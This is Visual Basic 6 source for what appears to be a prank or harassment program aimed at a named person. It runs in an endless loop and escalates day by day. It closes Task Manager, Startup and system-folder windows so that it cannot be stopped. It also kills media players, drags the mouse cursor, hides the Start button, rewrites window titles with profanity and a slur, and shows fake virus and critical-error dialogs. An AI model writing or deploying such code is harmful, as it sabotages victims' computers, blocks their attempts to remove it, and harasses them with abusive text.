Attribute VB_Name = "modMain"
Sub Main()
Dim sTemp As String
Dim lTemp As Long
Dim i As Integer, j As Integer
Dim X As Integer, Y As Integer
Dim pos As POINTAPI

Const CURSORSPEED As Single = 5 ' 3 times

Dim oldpoint As POINTAPI
Dim newpoint As POINTAPI

Dim aStringFind() As Variant
Dim aStringReplace() As Variant
Dim aRandomMessage() As Variant

If App.PrevInstance Then End

modStrings.Init

aStringFind = Array("start", "people", "Michael", "Start", "girl", "blue", "5", "of", "read", "offf", "C:\")
aStringReplace = Array("fuck", "dick", "fag", "fuck", "boy", "red", "6", "off", "seed", "off", "Coleman you fuckup:\")
aRandomMessage = Array("There is fucking problem with the computer.", "The system is fucked.", "You have a fucking virus", "You have trojan horse", "I'm rick james bitch")

Randomize

GetCursorPos oldpoint

On Error Resume Next

'ShowInTaskList 0

    While True
        
        'Pause 0.01
        DoEvents
        
        Select Case Day(Date)
        Case 1
            ShowHWND hwndStartButton
            SetWindowText hwndStartButton, "start"
        Case Is >= 2    ' THIS IS WHAT HAPPENS FROM DAY 2

            ' do things to windows
            For i = 1 To 2
                If i = 1 Then lTemp = WindowAtCursor Else lTemp = GetForegroundWindow
                sTemp = WindowText(lTemp)
                
                Select Case True
                Case sTemp = "Windows Task Manager"
                    DestroyWindow lTemp
                    CloseWindow lTemp
                Case sTemp = "Startup"
                    DestroyWindow lTemp
                    CloseWindow lTemp
                Case sTemp = "WINDOWS"
                    DestroyWindow lTemp
                    CloseWindow lTemp
                Case sTemp = "system32"
                    DestroyWindow lTemp
                    CloseWindow lTemp
                End Select
            Next i

        If Day(Date) >= 22 Then   ' THIS IS WHAT HAPPENS FROM SUNDAY ON
        
            ' do things to windows
            For i = 1 To 2
                If i = 1 Then lTemp = WindowAtCursor Else lTemp = GetForegroundWindow
                sTemp = WindowText(lTemp)
                
                Select Case True
                Case InStr(1, UCase(sTemp), "MEDIA PLAYER", vbBinaryCompare) > 0, InStr(1, UCase(sTemp), "DVD", vbBinaryCompare) > 0
                    PostMessage lTemp, WM_QUIT, 0&, 0&
                    DestroyWindow lTemp
                    CloseWindow lTemp
                    MsgBox sStrings(0), vbOKOnly + vbExclamation, "System Error"
                    Beep
                Case sTemp = "iTunes"
                    MoveCursor -1, -1
                End Select
            Next i
            
            ' open cdrom
            'If Rnd < 0.001 And Rnd < 0.001 Then
            '
            'End If
        
        End If
        If Day(Date) >= 23 Then   ' THIS IS WHAT HAPPENS FROM MONDAY ON
        
            ' weird cursor (hard to point at small things)
            GetCursorPos newpoint
            pos.X = (newpoint.X - oldpoint.X)
            pos.Y = (newpoint.Y - oldpoint.Y)
            oldpoint.X = oldpoint.X + (pos.X / Abs(pos.X)) * CURSORSPEED
            oldpoint.Y = oldpoint.Y + (pos.Y / Abs(pos.Y)) * CURSORSPEED
            SetCursorPos oldpoint.X, oldpoint.Y
            
            ' flashing start menu
            If Rnd < 0.15 Then HideHWND hwndStartButton
            If Rnd < 0.002 Then ShowHWND hwndStartButton
            
        End If
        If Day(Date) >= 24 Then   ' THIS IS WHAT HAPPENS FROM TUESDAY ON
        
            ' let start menu recover when not selected
            If Rnd < 0.001 Then SetWindowText hwndStartButton, "start"
            
            ' change words/ make stupid words
            For j = 1 To 2
                If j = 1 Then lTemp = WindowAtCursor Else lTemp = GetForegroundWindow
                sTemp = WindowText(lTemp)
                    
                If sTemp <> vbNullString Then
                    For i = LBound(aStringFind) To UBound(aStringFind)
                        sTemp = Replace(sTemp, aStringFind(i), aStringReplace(i), , , vbBinaryCompare)
                        sTemp = Replace(sTemp, aStringReplace(i) & aStringReplace(i), aStringReplace(i), , , vbBinaryCompare)
                    Next i
                    SetWindowText lTemp, sTemp
                End If
            Next j
            
        End If
        If Day(Date) >= 25 Then   ' THIS IS WHAT HAPPENS FROM WEDNESDAY ON
            
            ' crazy error messages
            If Rnd < 0.00001 And Rnd < 0.1 Then MsgBox aRandomMessage(Rnd * UBound(aRandomMessage)), vbAbortRetryIgnore + vbSystemModal + vbCritical, "Critical Error"
        
        End If
        End Select

    Wend

End Sub


